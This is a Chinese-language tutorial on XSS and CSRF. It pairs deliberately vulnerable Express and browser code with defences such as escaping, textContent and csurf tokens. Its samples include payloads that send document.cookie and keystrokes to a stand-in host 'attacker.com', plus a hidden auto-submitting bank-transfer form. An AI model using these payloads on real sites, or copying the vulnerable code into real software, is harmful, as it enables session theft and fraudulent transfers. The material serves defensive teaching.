---
title: XXS 和 CRSF
description: 在 Web 安全领域中，XSS 和 CSRF 是最常见的攻击方式，因此了解其攻击原理及如何防御是非常有必要的。
tags:
  - 网络
  - 安全
injectDocBefore: true
---

## XSS（Cross-Site Scripting，跨站脚本攻击）

XSS 是攻击者在目标网站注入恶意脚本，当其他用户访问时，恶意脚本在用户浏览器中执行，从而对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。

XSS 攻击可以分为 3 类：反射型（非持久型）、存储型（持久型）、基于DOM。

### 反射型

反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器，这种攻击方式往往需要攻击者诱使用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。

服务端代码

```js
app.get('/search', (req, res) => {
  const query = req.query.q

  // 直接返回用户输入到 HTML 中
  res.send(`
    <html>
      <body>
        <h1>搜索结果: ${query}</h1>
        <div id="results">...</div>
      </body>
    </html>
  `)
})
```

前端代码

```
http://yoursite.com/search?q=<script>alert(document.cookie)</script>
或
http://yoursite.com/search?q=<img src=x onerror="fetch('http://attacker.com?c='+document.cookie)">

```

防御方法

```js
const validator = require('validator')

app.get('/search', (req, res) => {
  let query = req.query.q || ''

  // 转义 HTML 特殊字符
  query = validator.escape(query)

  res.send(`
    <html>
      <body>
        <h1>搜索结果: ${query}</h1>
        <div id="results">...</div>
      </body>
    </html>
  `)
})

// 更好的做法：使用模板引擎
const ejs = require('ejs')

app.get('/search', (req, res) => {
  const query = req.query.q || ''

  // EJS 会自动转义 <%= %>
  res.render('search', { query })
})
```

### 存储型

存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。

服务端代码

```js
app.post('/api/comments', async (req, res) => {
  const { content, articleId } = req.body

  // 直接存储用户输入，没有任何过滤
  await db.comments.insert({
    content: content,
    articleId: articleId,
    createdAt: new Date()
  })

  res.json({ success: true })
})

app.get('/api/comments/:articleId', async (req, res) => {
  const comments = await db.comments.find({
    articleId: req.params.articleId
  })
  res.json(comments)
})
```

前端代码

```html
<div id="comments"></div>

<script>
  // 获取评论并直接渲染
  fetch('/api/comments/123')
    .then(res => res.json())
    .then(comments => {
      const html = comments
        .map(
          comment => `
        <div class="comment">
          <p>${comment.content}</p>
        </div>
      `
        )
        .join('')

      document.getElementById('comments').innerHTML = html
    })
</script>

<!-- 攻击者在评论框输入如下内容 -->
<script>
  // 窃取用户 Cookie
  fetch('http://attacker.com/steal?cookie=' + document.cookie)

  // 或者窃取用户输入
  document.addEventListener('input', e => {
    fetch('http://attacker.com/log?data=' + e.target.value)
  })

  // 或者伪造表单
  document.body.innerHTML = '<form action="http://attacker.com">...'
</script>

<!-- 或者更隐蔽的： -->
<img src="x" onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)" />
```

防御方法

```js
const validator = require('validator')
const xss = require('xss')

app.post('/api/comments', async (req, res) => {
  let { content, articleId } = req.body

  // 1. 输入验证
  if (!validator.isLength(content, { min: 1, max: 500 })) {
    return res.status(400).json({ error: '评论长度必须在1-500字符之间' })
  }

  // 2. XSS 过滤 - 清理 HTML 标签
  content = xss(content, {
    whiteList: {}, // 不允许任何 HTML 标签
    stripIgnoreTag: true
  })

  // 或者完全转义
  content = validator.escape(content)

  await db.comments.insert({
    content: content,
    articleId: validator.escape(articleId),
    createdAt: new Date()
  })

  res.json({ success: true })
})
```

### DOM 型

基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。

前端代码

```js
// 从 URL hash 获取内容并显示
const content = window.location.hash.substring(1)
document.getElementById('message').innerHTML = content

// 攻击 URL:
// http://yoursite.com/#<img src=x onerror="alert(document.cookie)">
```

防御方法

```js
const content = decodeURIComponent(window.location.hash.substring(1))

// 方法1: 使用 textContent
document.getElementById('message').textContent = content

// 方法2: 创建文本节点
const textNode = document.createTextNode(content)
document.getElementById('message').appendChild(textNode)

// 方法3: 验证和过滤
function isValidContent(content) {
  // 只允许字母、数字、空格
  return /^[a-zA-Z0-9\s]+$/.test(content)
}

if (isValidContent(content)) {
  document.getElementById('message').textContent = content
} else {
  document.getElementById('message').textContent = '无效内容'
}
```

## CSRF (Cross Site Request Forgery，跨站请求伪造)

CSRF 攻击是攻击者借助受害者的 Cookie 骗取服务器的信任，可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击服务器，从而在并未授权的情况下执行在权限保护之下的操作。

服务端代码

```js
// 银行转账
app.post('/api/transfer', authenticateUser, async (req, res) => {
  const { to, amount } = req.body
  const from = req.user.id // 从已认证的用户获取

  // 直接执行转账，没有验证请求来源
  await db.transactions.insert({
    from: from,
    to: to,
    amount: amount,
    timestamp: new Date()
  })

  res.json({ success: true })
})
```

前端代码

```html
<!-- 攻击者网站 attacker.com -->
<!doctype html>
<html>
  <body>
    <!-- 方法1: 自动提交的表单 -->
    <h1>恭喜你中奖了！点击领取...</h1>
    <!-- 隐藏的表单，自动提交 -->
    <form id="hack" action="http://bank.com/api/transfer" method="POST" style="display:none;">
      <input type="hidden" name="to" value="attacker123" />
      <input type="hidden" name="amount" value="10000" />
    </form>
    <script>
      // 页面加载时自动提交
      document.getElementById('hack').submit()
    </script>

    <!-- 方法2: 使用图片标签 (GET 请求) -->
    <img src="http://bank.com/api/transfer?to=attacker123&amount=10000" style="display:none;" />

    <!-- 方法3: 使用 JavaScript fetch -->
    <script>
      fetch('http://bank.com/api/transfer', {
        method: 'POST',
        credentials: 'include', // 包含 Cookie
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          to: 'attacker123',
          amount: 10000
        })
      })
    </script>
  </body>
</html>
```

攻击过程

```
1. 用户登录 bank.com，获得 Session Cookie
2. 用户访问攻击者的网站 attacker.com（通过钓鱼邮件等）
3. attacker.com 的恶意代码自动向 bank.com 发起转账请求
4. 浏览器自动携带 bank.com 的 Cookie
5. bank.com 认为这是合法的用户请求，执行转账
```

防御方法

```
1. 添加 Token
2. SameSite Cookie
3. 验证 Origin/Referer
4. 验证码
5. 敏感操作二次验证
```

1. 添加 token

后端代码

```js
const csrf = require('csurf')
const cookieParser = require('cookie-parser')

app.use(cookieParser())

// 设置 CSRF 保护
const csrfProtection = csrf({
  cookie: {
    httpOnly: true,
    secure: true, // 生产环境使用 HTTPS
    sameSite: 'strict'
  }
})

// 获取 CSRF Token 的端点
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() })
})

// 保护的转账接口
app.post('/api/transfer', csrfProtection, authenticateUser, async (req, res) => {
  const { to, amount } = req.body
  const from = req.user.id

  // CSRF 中间件会自动验证 token
  // 如果 token 无效，请求会被拒绝

  await db.transactions.insert({
    from: from,
    to: to,
    amount: amount,
    timestamp: new Date()
  })

  res.json({ success: true })
})
```

前端代码

```js
class ApiClient {
  constructor() {
    this.csrfToken = null
  }

  // 初始化时获取 CSRF Token
  async init() {
    const response = await fetch('/api/csrf-token', {
      credentials: 'include'
    })
    const data = await response.json()
    this.csrfToken = data.csrfToken

    // 存储到 localStorage（可选）
    localStorage.setItem('csrfToken', this.csrfToken)
  }

  // 所有 POST 请求都包含 CSRF Token
  async post(url, data) {
    if (!this.csrfToken) {
      await this.init()
    }

    return fetch(url, {
      method: 'POST',
      credentials: 'include', // 包含 Cookie
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': this.csrfToken // 关键：包含 token
      },
      body: JSON.stringify(data)
    })
  }
}

// 使用示例
const api = new ApiClient()
await api.init()

// 转账请求
async function transfer(to, amount) {
  try {
    const response = await api.post('/api/transfer', {
      to: to,
      amount: amount
    })

    if (response.ok) {
      console.log('转账成功')
    }
  } catch (error) {
    console.error('转账失败', error)
  }
}
```
